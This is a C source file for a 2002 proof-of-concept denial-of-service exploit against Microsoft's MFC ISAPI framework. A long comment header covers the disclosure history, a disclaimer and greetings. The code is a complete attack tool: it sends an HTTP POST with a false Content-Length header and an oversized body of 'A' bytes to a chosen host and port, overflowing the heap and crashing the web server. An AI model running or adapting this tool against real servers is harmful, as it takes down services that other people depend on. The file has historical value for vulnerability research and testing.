/*
MFCISAPI.C by Matthew Murphy
DoSing Servers w/ no Content-Length sanitation
Example of MFC ISAPI heap overflow

Disclaimer: DON'T ABUSE THIS CODE!  Use it only to
test your servers for vulnerabilities.  Do not test
against servers:

1) You do not control
2) Business-critical systems
...

If the possession, compiling, or any use of this code 
causes damage to your system or any other:

a) I don't know who wrote it. :-)
b) YOU are responsible for the damage.
c) Me, my providers, and anyone else displaying this
	code are not responsible for it, YOU ARE!

Vulnerability Details:
Murphy Security Advisory #12, 2002
"Microsoft Foundation Classes ISAPI Framework Heap Overflow Vulnerability"
http://www.murphy.101main.net/vulns/2002-12.shtml

Compiling: Windows, Free/Open/NetBSD, and Linux
Tested on Windows with MSVC++ 6.0.

Windows: WinSock 1.1 can cause some issues with 
numerous internet apps, including this one.
It is recommended that you simply upgrade (if
on Windows 95/NT 3.51) to WinSock 2.0 and replace 
"0x0101" with "0x0002" in the WSAStartup() call.

Background

On July 8, 2002, I submitted a report to BugTraq
regarding two unrelated vulnerabilities in Working
Resources' BadBlue PWS.  The report was intentionally
vague, so as to wait until a patch was released to
disclose details of the vulnerabilities.

The vulnerabilties were assigned the following
spots on SecurityFocus:

BID 5187: Working Resources BadBlue Get Request
Denial of Service Vulnerability

BID 5188: Working Resources BadBlue ISAPI Denial of
Service Vulnerability

The vulnerability that became BID 5188 was attributed
to a non-exploitable Heap Overrun in ext.dll.

On July 9, I noted to the BadBlue team that the cause
of the crash following the overflow seemed to be one
of two pointers being overwritten (the pointer that
caused the error varied with buffer length).  There
was a pointer used by MSVCRT.DLL, and another used by
MFC42.DLL.  Although I found this odd, I did no further
investigation.

On July 10, 2002, the BadBlue team informed me that
the ISAPI Heap Overflow was not occuring inside the
BadBlue code, but somewhere in the MFC classes that
are responsible for ISAPI handling.

I submitted the vulnerability to the Microsoft Security
Response Center within minutes of this e-mail from the
BadBlue team.  I received a reply over a day later
that simply asked me to clarify "if I was asking them
to do something", specifically if I was speaking of
an issue in IIS or asking them to identify if it did
exist there.  They had no clue.

I submitted in response that a serious vulnerability
existed in the MFC ISAPI framework, and yes, knowing
if the issue affected IIS would allow me and the
community in general to better analyze both the risk
the vulnerability posed and who it affected.

Having received no reply from MSRC, I can conclude
both that server administrators need way to protect
themselves from this vulnerability, and also that it
won't come from Microsoft.

So, I have provided this sample exploit so that users
of (suspected) vulnerable ISAs can test both their
server's handling of the exploitable condition (that
being incorrect Content-Length headers) as well as
the response of various ISAs they run to an attack
that exploited this vulnerability.

Greets/Shouts

I'll divide these into two sections, the industry,
and "the others" (i.e, school pals, etc.).  I'll do 
these first:

Kyle - No grudges?  WHEW! :-)

Rachel - Thanx for the encouragement, and for being
	a good listener.  I needed that.  Sorry you
	had to play the role of relay -- that's not
	something I wish on anybody.

Jessica - I'm still amazed/impressed by how well you
	handled that whole mess (talk about in the
	middle of a feud...)

Bobbitt - I wish I had not involved you in this mess,
	boy was that a disaster. You made a bigger
	impact than I gave you credit for.  And I
	am accusing people of being un-grateful...

JT - Another XP box bites the dust.  I hate to see
	it happen to you, but it was only a matter
	of time, after all, it is an MS product...

Thor Larholm - Joining PivX was a step backward.
	Good work though on TL003.  I'm glad you
	liked the "LocalRead" binary exploit.

MS Product Security - Response to the MFC overflow
	was sluggish, at best.  What's going on?

AOL - Nice job *covering up* the Game request buffer
	overflow.  Moral: Fix the problem at its source.
	Worry about your customers, not your wallet, Mr.
	Case.

Netscape - Committed to security?  So much so that you
	are even willing to sell out on customers for
	a pitiful $1000?  The only person who calls
	that committed is Mr. Gates.  AHEM! :-)

"Joe Testa" - Thanks for the tips on the BadBlue
	alert (Re: DoS, Heap Overflow); I will use
	them in the future.

Scott Slater - Prompt responses, at least.  How did
	you miss "/../"?  It's not exactly stealthy! :-XD

Steve Shering - The decision to leave the samples
	vulnerable was a huge mistake.

iMatix - It only took you a week to reply to the GSL
	inquiry!  C'mon, that's too MS-ish for something
	that I run...

And, ladies and gents, without further ado, I present...

Remote diversion/crash of any MFC ISA, from the comfort of 
your own home, office, or where ever you choose!

Credit: BadBlue support helped me to isolate and identify
the cause and scope of this issue -- it is more widespread
than originally thought by far.

Tested on BadBlue 1.73 EXT.DLL (Listening on port 82):

mfcisapi 127.0.0.1 ext.dll 82
Exploit sent -- check if the server/worker is dead.

BADBLUE caused an invalid page fault in MSVCRT.DLL.
BADBLUE will now close.

If you continue to encounter problems, try restarting
your computer.

1) The location of the fault changed depending on how 
long the buffer was (not surprising).

2) The fault occured after the response had been sent
by the server (odd).

3) Crashes always occured on overwritten heap pointers
(which makes sense).

4) I was unable to overwrite the lowest byte of any of
them, no matter how large the entity was (which does not).

One last shout to Thor, Joe, and the folks at iMatix and
MSPS.

And, to all of my friends, you're the best!
*/

#ifdef _WIN32
#define _WINSOCKAPI_
#include <winsock2.h>
#pragma comment(lib, "wsock32.lib")
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#endif
#include <stdio.h>
#include <string.h>

#define BUFF_SIZE	6300			/* Change this for bigger buffers */

#define nprintf(x)	printf(x)		/* Add newline in printf() calls */
#define die(x)		nprintf(x); exit(0);	/* Macro: Write error and exit */

static char request[] = "POST /%s HTTP/1.0\x0d\x0a"
			"Content-Length: 1\x0d\x0a\x0d\x0a"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0d\x0a\x0d\x0a";

/* Using DoS tools for dummies :-) */

void usage(void) {
	nprintf("Usage: mfcisapi <host> <isapi> [port]\x0d\x0a\x0d\x0ahost - the address to exploit (e.g, 127.0.0.1)\x0d\x0aisapi - the path of the ISAPI DLL/mapping to exploit (e.g, /ext.dll, /iisstart.asp)\x0d\x0aport - the port that the web service runs on (usually 80)");
	exit(1);
}

void main(int argc, char *argv[]) {

/* Set up some stack storage... */

	SOCKET hSock;			/* Socket descriptor handle */
	unsigned short port;		/* This is set to default after WSAStartup() */
	int buffsize = 1024;		/* Some ISAs need bigger; set at command-line */
	struct hostent *he;		/* For DNS resolution */
	char exploit[BUFF_SIZE];	/* BIG uninitialized buffer for the exploit. */
	struct sockaddr_in sa_in;	/* Socket address storage */
	char *offset;			/* Buffer pointer */
	int i;				/* Counting integer */

/*
 * Windows-specific crap to initialize WinSock
 * This compatibility stuff bloats my code rather
 * badly... (I love Windows! :-XD)
*/

#ifdef _WIN32
	WSADATA wsa_prov;
	if (!WSAStartup(0x0101, &wsa_prov) == 0) {
		die("WinSock initialization failed!");
	}
#endif

/* Handle the argument vector */

	port = htons(80);
	switch(argc) {
	case 5:
		buffsize = atoi(argv[4]);
	case 4:
		port = htons((unsigned short)atoi(argv[3]));
	case 3:
		break;
	case 2:
	case 1:
	default:
		usage();
	}

/* Make the TCP socket for the exploit */

	hSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hSock == SOCKET_ERROR) {
		die("Couldn't create exploit socket!");
	}

/* Fill in the address information */

	sa_in.sin_family = AF_INET;
	sa_in.sin_port = port;
	sa_in.sin_addr.S_un.S_addr = inet_addr(argv[1]);

/* Create memory buffer for exploit */

	sprintf(&exploit[0], &request[0], argv[2]);

/* Try to connect to the victim server. */

	if (!connect(hSock, &sa_in, sizeof(struct sockaddr_in)) == 0) {
		die("Couldn't connect; probably no web server there.");
	}

/* Send out the overflow */

	send(hSock, &exploit[0], strlen(&exploit[0]), 0);
	nprintf("Exploit sent -- check if the server/worker is dead.");

/* Do some cleanup */

	shutdown(hSock, SD_BOTH);
#ifndef _WIN32
	close(hSock);
#else				/* Once again, Windows deviates... */
	closesocket(hSock);
	WSACleanup();
#endif
	return;
}